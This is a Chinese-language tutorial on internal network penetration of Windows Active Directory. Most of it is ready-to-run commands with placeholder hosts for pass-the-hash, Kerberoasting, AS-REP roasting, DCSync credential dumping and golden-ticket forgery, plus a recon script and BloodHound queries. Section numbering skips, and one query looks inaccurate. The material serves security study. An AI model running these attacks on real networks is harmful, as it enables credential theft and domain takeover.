# 内网渗透实战

> 内网渗透是渗透测试的核心能力，涉及域环境攻击、横向移动、权限提升和持久化等高级技术。

---

## 一、内网渗透概述

### 1.1 内网渗透定义

内网渗透是指在获取目标网络初始 foothold 后，在内网环境中进行信息收集、横向移动、权限提升和数据获取的过程。与外网渗透不同，内网渗透更关注：
- 域环境安全
- 横向移动技术
- 凭据获取与利用
- 绕过内网安全防护

### 1.2 内网渗透场景

**场景分类**
- 企业内网渗透：从外网突破后进入内网
- 内网安全评估：在内网起点进行评估
- 红队内网渗透：模拟 APT 攻击的长期内网潜伏
- 勒索病毒模拟：模拟勒索软件内网传播

## 二、Windows 域环境基础

### 2.1 Active Directory 架构

**AD 核心组件**
- 域控制器（DC）：存储 AD 数据库
- 全局目录（GC）：全局目录服务器
- FSMO 角色：域级和林级操作主机
- 站点（Site）：网络拓扑表示
- 组织单元（OU）：域内容器
- 组策略（GPO）：策略下发

**AD 关键对象**
- 用户对象：域用户、服务账户、计算机账户
- 组对象：安全组、通讯组
- 计算机对象：域加入机器
- 服务账户：运行服务的域账户

### 2.2 Kerberos 认证机制

**Kerberos 认证流程**
```
阶段1: AS-REQ / AS-REP（认证服务交换）
├── 客户端 → KDC: 发送 AS-REQ（包含预加密的用户哈希）
└── KDC → 客户端: 返回 AS-REP（包含 TGT 和 Session Key）

阶段2: TGS-REQ / TGS-REP（票据授权服务交换）
├── 客户端 → KDC: 发送 TGS-REQ（TGT + 请求的服务 SPN）
└── KDC → 客户端: 返回 TGS-REP（包含 ST 和服务 Session Key）

阶段3: AP-REQ / AP-REP（应用服务交换）
├── 客户端 → 服务: 发送 AP-REQ（ST + 认证符）
└── 服务 → 客户端: 返回 AP-REP（可选双向认证）
```

**Kerberos 攻击面**
- AS-REP Roasting：离线爆破 AS-REP 响应
- Kerberoasting：离线爆破 TGS-REP 响应
- 黄金票据（Golden Ticket）：伪造 TGT
- 白银票据（Silver Ticket）：伪造 TGS
- Pass the Key / Overpass the Hash：使用 AES 密钥获取 TGT
- DCSync：模拟 DC 同步凭据

### 2.3 NTLM 认证机制

**NTLM 认证流程**
```
1. 协商: 客户端 → 服务器（协商消息）
2. 挑战: 服务器 → 客户端（挑战消息，含随机 Challenge）
3. 认证: 客户端 → 服务器（使用 NTLM Hash 加密 Challenge）
```

**NTLM 攻击面**
- Pass the Hash：使用 NTLM Hash 认证
- NTLM Relay：中继 NTLM 认证
- 离线破解 NTLM Hash

## 四、横向移动技术

### 4.1 Windows 横向移动

#### 4.1.1 Pass the Hash

**PtH 原理**
- 使用 NTLM Hash 替代明文密码进行认证
- 适用于 NTLM 认证的所有协议（SMB/WMI/HTTP/MSSQL）

**工具使用**
```bash
# CrackMapExec / NetExec
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Impacket
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# Evil-WinRM
evil-winrm -i 10.0.0.10 -u administrator -H NTLM_HASH

# Mimikatz
mimikatz # sekurlsa::pth /user:administrator /domain:domain.com /ntlm:NTLM_HASH /run:cmd.exe
```

#### 4.1.2 Pass the Ticket

**PtT 原理**
- 使用 Kerberos 票据（TGT/TGS）进行认证
- 票据存储在内存中（LSASS）
- 无需密码或 Hash

**工具使用**
```bash
# Rubeus
Rubeus.exe ptt /ticket:base64_ticket
Rubeus.exe asktgt /user:username /rc4:NTLM_HASH /ptt

# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Impacket
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.com/user@10.0.0.10
```

#### 4.1.3 Kerberoasting

**原理**
- 请求服务票据（TGS）
- 票据用服务账户的密码 Hash 加密
- 离线破解获取服务账户明文密码

**操作流程**
```bash
# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# 使用 Impacket
impacket-GetUserSPNs domain.com/user:password -request -outputfile hashes.txt

# 使用 PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding UTF8 hashes.txt

# 破解
hashcat -m 13100 hashes.txt wordlist.txt
john --format=krb5tgs hashes.txt
```

#### 4.1.4 AS-REP Roasting

**原理**
- 针对设置了"不需要 Kerberos 预认证"的用户
- 可以直接获取 AS-REP 响应
- 离线破解获取用户明文密码

**操作流程**
```bash
# 使用 Rubeus
Rubeus.exe asreproast /outfile:hashes.txt

# 使用 Impacket
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -format hashcat -outputfile hashes.txt

# 破解
hashcat -m 18200 hashes.txt wordlist.txt
```

#### 4.1.5 DCSync

**原理**
- 模拟域控制器的复制行为
- 通过 DRSUAPI 接口获取域内所有用户的 Hash
- 需要 DCsync 权限（Domain Admins / DC 本身 / 特定权限）

**操作流程**
```bash
# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.com /all /csv

# Impacket
impacket-secretsdump domain.com/user:password@DC_IP -just-dc
```

#### 4.1.6 黄金票据

**原理**
- 获取 krbtgt 账户 Hash 后
- 可以伪造任意用户的 TGT
- 票据有效期默认 10 年
- 即使重置用户密码仍然有效

**操作流程**
```bash
# Mimikatz 生成黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Impacket 生成票据
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.com Administrator
```

## 九、内网渗透实战案例

### 9.1 场景：从 Web Shell 到域管

```
1. 获取 Web Shell
   - 通过文件上传漏洞获取 Web Shell
   - 执行命令获取当前权限（IIS 用户 / www-data）

2. 权限提升
   - 运行 WinPEAS 发现内核漏洞
   - 利用 PrintNightmare 提权到 SYSTEM

3. 凭据收集
   - Mimikatz dump LSASS
   - 获取本地管理员凭据
```

## 十、内网信息收集自动化

### 10.1 PowerShell 自动化信息收集

```powershell
# 内网信息收集一键脚本
function Invoke-InternalRecon {
    <#
    .SYNOPSIS
        内网信息收集自动化脚本
    #>
    
    $report = @{}
    
    # 1. 系统信息
    $report["System"] = @{
        Hostname = $env:COMPUTERNAME
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        InstallDate = (Get-WmiObject Win32_OperatingSystem).InstallDate
    }
    
    # 2. 网络信息
    $report["Network"] = @{
        IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | 
                       Where-Object {$_.IPAddress -notlike "127.*"} | 
                       Select-Object -ExpandProperty IPAddress)
        DNS = (Get-DnsClientServerAddress -AddressFamily IPv4 | 
               Select-Object -ExpandProperty ServerAddresses -Unique)
        ARPTable = (Get-NetNeighbor -State Reachable | 
                    Select-Object IPAddress, LinkAddress)
        Routes = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | 
                  Select-Object NextHop, InterfaceAlias)
        ListeningPorts = (Get-NetTCPConnection -State Listen | 
                         Select-Object LocalAddress, LocalPort, OwningProcess)
    }
    
    # 3. 用户与会话
    $report["Users"] = @{
        LocalUsers = (Get-LocalUser | Select-Object Name, Enabled, LastLogon)
        LoggedOn = (query user 2>$null)
        LocalAdmins = (Get-LocalGroupMember -Group "Administrators" | 
                       Select-Object Name, ObjectClass)
    }
    
    # 4. 进程与服务
    $report["Processes"] = @{
        Running = (Get-Process | Sort-Object CPU -Descending | 
                   Select-Object -First 20 Name, Id, CPU, WS)
        Services = (Get-Service | Where-Object {$_.Status -eq "Running"} | 
                    Select-Object Name, DisplayName)
        ScheduledTasks = (Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | 
                          Select-Object TaskName, TaskPath)
    }
    
    # 5. 共享信息
    $report["Shares"] = @{
        Local = (Get-SmbShare | Select-Object Name, Path, Description)
        Sessions = (Get-SmbSession 2>$null | Select-Object ClientUserName, ClientComputerName)
        Connections = (Get-SmbConnection 2>$null | Select-Object ServerName, ShareName)
    }
    
    # 6. 安装的软件
    $report["Software"] = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
                           Select-Object DisplayName, DisplayVersion, Publisher) 
    
    return $report
}

# 执行并输出
$recon = Invoke-InternalRecon
$recon | ConvertTo-Json -Depth 3
```

### 10.3 BloodHound 深度分析

```cypher
// BloodHound 高级 Cypher 查询

// 1. 查找所有到 Domain Admin 的路径（限制跳数）
MATCH (n:User),(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((n)-[:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ForceChangePassword|GPLink|AllowedToDelegate|AddMember*1..6]->(m))
RETURN p

// 2. 查找所有具有 DCSync 权限的用户
MATCH (n)-[:GetChanges|GetChangesAll]->(m:Domain)
RETURN n.name, m.name

// 3. 查找可以通过 Kerberoasting 获取的账户
MATCH (n:User) WHERE n.kerberoastable=true
RETURN n.name, n.serviceprincipalnames, n.enabled

// 4. 查找所有 AS-REP Roastable 用户（不需要预认证）
MATCH (n:User) WHERE n.dontreqpreauth=true
RETURN n.name

// 5. 查找可以控制其他用户的用户（GenericAll/GenericWrite/ForceChangePassword）
MATCH (n:User)-[r:GenericAll|GenericWrite|ForceChangePassword|WriteDacl|WriteOwner]->(m:User)
RETURN n.name, type(r), m.name

// 6. 查找所有有管理员权限的计算机
MATCH (n:User)-[:AdminTo]->(m:Computer)
RETURN n.name, m.name

// 7. 查找 GPO 权限滥用
MATCH (n)-[:GPLink]->(m:GPO)
WHERE n:User OR n:Group
RETURN n.name, m.name

// 8. 查找非约束委派
MATCH (n)-[:UnconstrainedDelegation]->(m)
RETURN n.name, m.name
```
